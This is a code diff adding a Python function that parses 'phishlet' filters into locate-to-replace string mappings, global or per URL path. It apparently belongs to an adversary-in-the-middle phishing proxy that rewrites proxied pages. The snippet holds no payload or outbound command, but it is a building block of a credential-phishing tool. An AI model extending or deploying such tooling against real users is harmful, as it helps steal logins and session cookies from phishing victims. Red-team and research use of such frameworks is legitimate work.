@@ -391,3 +391,54 @@ def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_doma
         return marked_body
     
     return request_body
+
+
+def process_phishlet_filters(phishlet_data, request_path, debug_log=None):
+    """
+    Process phishlet filters and return a mapping of locate -> replace pairs.
+    
+    Args:
+        phishlet_data: The phishlet configuration data containing filters
+        request_path: The current request path for URL-specific filters
+        debug_log: Optional debug logging function
+    
+    Returns:
+        dict: Mapping of locate strings to replace strings
+    """
+    if not phishlet_data:
+        return {}
+    
+    filters = phishlet_data.get('filters', [])
+    if not filters:
+        return {}
+    
+    filter_replacements = {}
+    
+    for filter_item in filters:
+        if filter_item.get('type') == 'url':
+            if filter_item.get('url') == '*':
+                # Global filter - applies to all URLs
+                locate = filter_item.get('locate')
+                replace = filter_item.get('replace')
+                if locate and replace:
+                    filter_replacements[locate] = replace
+                    if debug_log:
+                        debug_log(f"  String replacement mapping (global): {locate} -> {replace}", "DEBUG")
+            else:
+                # URL-specific filter - check if it matches current request path
+                filter_url = filter_item.get('url', '')
+                if filter_url == request_path or filter_url in request_path:
+                    locate = filter_item.get('locate')
+                    replace = filter_item.get('replace')
+                    if locate and replace:
+                        filter_replacements[locate] = replace
+                        if debug_log:
+                            debug_log(f"  String replacement mapping (URL-specific): {locate} -> {replace} for path {request_path}", "DEBUG")
+                else:
+                    if debug_log:
+                        debug_log(f"  Skipping string replacement for path {request_path} (filter URL: {filter_url})", "DEBUG")
+        else:
+            if debug_log:
+                debug_log(f"  Skipping non-URL filter: {filter_item.get('type')}", "DEBUG")
+    
+    return filter_replacements
